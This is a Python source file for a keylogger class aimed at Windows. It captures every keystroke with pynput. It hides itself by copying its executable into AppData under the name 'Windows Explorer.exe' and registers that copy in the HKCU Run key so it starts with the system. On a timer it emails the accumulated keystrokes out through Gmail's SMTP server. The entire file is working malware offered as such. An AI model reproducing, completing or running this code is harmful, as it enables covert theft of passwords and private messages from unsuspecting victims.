# Importing libraries/modules
from pynput.keyboard import Key, Listener
from threading import Timer
import smtplib
import os
import shutil
import subprocess
import sys
class Keylogger:

# Creating constructor method
    def __init__(self, time_interval, email, password):
        self.windows_persistent()
        self.log_file = "Logger Started"
        self.time_interval= time_interval
        self.email = email
        self.password = password
    
# Creating method for starting logger.exe automatically at system startup

    def windows_persistent(self):
        evil_file_location = os.environ["appdata"]+ "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable,evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v  winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)



# Appending to log_file
    def append_log_file(self,string):
        self.log_file = self.log_file + string


# Creating "on_press" method for keyword press 
    def on_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " +str(key)+ " "
        self.append_log_file(current_key)

# Creating "log_report" method for reporting keyword press
    def log_report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log_file)
        
        self.log_file = " "
        Timer(self.time_interval,self.log_report).start()

# Creating method for sending mail
    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()


# Creating "start" method for beginning the process 
    def start(self):
        with Listener(on_press=self.on_press) as listener:
            self.log_report()
            listener.join()
